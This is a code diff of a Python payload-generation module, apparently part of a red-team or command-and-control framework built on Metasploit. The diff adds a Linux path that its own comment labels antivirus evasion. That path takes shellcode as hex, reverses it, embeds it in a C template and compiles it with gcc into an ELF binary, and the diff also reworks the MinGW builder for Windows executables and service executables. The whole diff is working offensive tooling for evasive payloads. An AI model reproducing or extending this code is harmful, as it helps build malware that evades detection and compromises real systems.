@@ -15,7 +15,8 @@ from jinja2 import Environment, FileSystemLoader
 from Lib.api import data_return
 from Lib.configs import Payload_MSG, PAYLOAD_LOADER_STORE_PATH
 from Lib.file import File
-from Lib.mingw import MingwOld
+from Lib.gcc import Gcc, GCC_INCULDE_DIR, GCC_CODE_TEMPLATE_DIR
+from Lib.mingw import MINGW_CODE_TEMPLATE_DIR, Mingw, MINGW_INCULDE_DIR
 from Lib.msfmodule import MSFModule
 from Lib.notice import Notice
 
@@ -78,14 +79,13 @@ class Payload(object):
             if "windows" in mname:
                 opts["Format"] = 'exe-src'
             elif "linux" in mname:
-                opts["Format"] = 'elf'
+                opts["Format"] = 'elf-src'
             elif "java" in mname:
                 opts["Format"] = 'jar'
             elif "python" in mname:
                 opts["Format"] = 'py'
             elif "php" in mname:
                 opts["Format"] = 'raw'
-
             else:
                 context = data_return(306, Payload_MSG.get(306), {})
                 return context
@@ -137,6 +137,16 @@ class Payload(object):
             byteresult = Payload._create_payload_by_mingw(mname=mname, shellcode=byteresult,
                                                           payload_type="REVERSE_HEX_AS_SERVICE")
             filename = "{}.exe".format(int(time.time()))
+        # linux类型免杀
+        elif opts.get("Format") == "elf-src":
+            opts["Format"] = "hex"
+            result = MSFModule.run(module_type="payload", mname=mname, opts=opts)
+            if result is None:
+                context = data_return(305, Payload_MSG.get(305), {})
+                return context
+            byteresult = base64.b64decode(result.get('payload'))
+            byteresult = Payload._create_payload_by_gcc(mname=mname, shellcode=byteresult)
+            filename = "{}.elf".format(int(time.time()))
         else:
             file_suffix = {
                 "c": "c",
@@ -265,12 +275,12 @@ class Payload(object):
     @staticmethod
     def _create_payload_by_mingw(mname=None, shellcode=None, payload_type="REVERSE_HEX"):
         if payload_type == "REVERSE_HEX":
-            env = Environment(loader=FileSystemLoader(MingwOld.CODE_TEMPLATE_DIR))
+            env = Environment(loader=FileSystemLoader(MINGW_CODE_TEMPLATE_DIR))
             tpl = env.get_template('REVERSE_HEX.c')
             reverse_hex_str = bytes.decode(shellcode)[::-1]
             src = tpl.render(SHELLCODE_STR=reverse_hex_str)
         elif payload_type == "REVERSE_HEX_AS_SERVICE":
-            env = Environment(loader=FileSystemLoader(MingwOld.CODE_TEMPLATE_DIR))
+            env = Environment(loader=FileSystemLoader(MINGW_CODE_TEMPLATE_DIR))
             tpl = env.get_template('REVERSE_HEX_AS_SERVICE.c')
             reverse_hex_str = bytes.decode(shellcode)[::-1]
             src = tpl.render(SHELLCODE_STR=reverse_hex_str)
@@ -283,8 +293,27 @@ class Payload(object):
             arch = 'x86'
         else:
             raise Exception('unspport mname')
-        mingwx64 = MingwOld()
-        byteresult = mingwx64.compile_c(src, arch)
+        mingwx64 = Mingw(MINGW_INCULDE_DIR, src)
+        byteresult = mingwx64.compile_c(arch=arch)
+        return byteresult
+
+    @staticmethod
+    def _create_payload_by_gcc(mname=None, shellcode=None, payload_type="REVERSE_HEX"):
+        if payload_type == "REVERSE_HEX":
+            env = Environment(loader=FileSystemLoader(GCC_CODE_TEMPLATE_DIR))
+            tpl = env.get_template('REVERSE_HEX.c')
+            reverse_hex_str = bytes.decode(shellcode)[::-1]
+            src = tpl.render(SHELLCODE_STR=reverse_hex_str)
+        else:
+            raise Exception('unspport type')
+        if mname.startswith('linux/x64'):
+            arch = 'x64'
+        elif mname.startswith('linux/x86'):
+            arch = 'x86'
+        else:
+            raise Exception('unspport mname')
+        gcc = Gcc(GCC_INCULDE_DIR, src)
+        byteresult = gcc.compile_c(arch=arch)
         return byteresult
 
     @staticmethod
